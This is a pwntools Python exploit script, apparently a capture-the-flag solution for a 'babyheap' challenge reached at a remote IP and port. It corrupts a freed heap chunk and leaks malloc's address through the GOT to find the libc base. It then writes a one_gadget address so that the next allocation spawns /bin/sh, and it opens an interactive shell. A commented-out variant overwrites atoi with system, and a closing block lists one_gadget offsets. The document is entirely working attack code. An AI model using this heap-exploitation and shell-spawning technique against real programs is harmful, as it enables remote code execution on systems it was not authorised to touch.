from pwn import *
context.log_level = "debug"
# p = process("./babyheap")
p = remote("51.68.189.144" , 31005)
elf = ELF("./babyheap")
libc = ELF("./libc.so.6")

cmd = lambda c : p.sendafter("> " , str(c))

def create():
	cmd(1)

def dele():
	cmd(4)	

def edit(content):
	cmd(2) 
	p.sendafter("Content? ",content)

def back_malloc(content):
	cmd(1337) 
	p.sendafter("Fill ",content)

create()
dele()
edit(p64(0x602090 + 5 - 8) * 8)
create()
# system("/bin/sh\x00")
# back_malloc("a" * 0x2b + p64(elf.got["atoi"])[:3])
# atoi_addr = u64(p.recvuntil("\x7f").ljust(8 , "\x00"))
# libc.address = atoi_addr - libc.sym["atoi"]
# edit(p64(libc.sym["system"]))
# cmd("/bin/sh\x00")
# ______________________________________________________
# one_gadget
back_malloc("a"  * (3 + 0x38) + p64(elf.got["malloc"])[:3])
cmd(3)
p.recvuntil("Content: ")
malloc_addr = u64(p.recvuntil("\x7f").ljust(8 , "\x00"))
libc.address = malloc_addr - libc.sym["malloc"]
edit(p64(libc.address + 0x47c46))
create()
# ______________________________________________________
p.interactive()


"""
0x47c46	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x47c9a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xfccde	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xfdb8e	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""


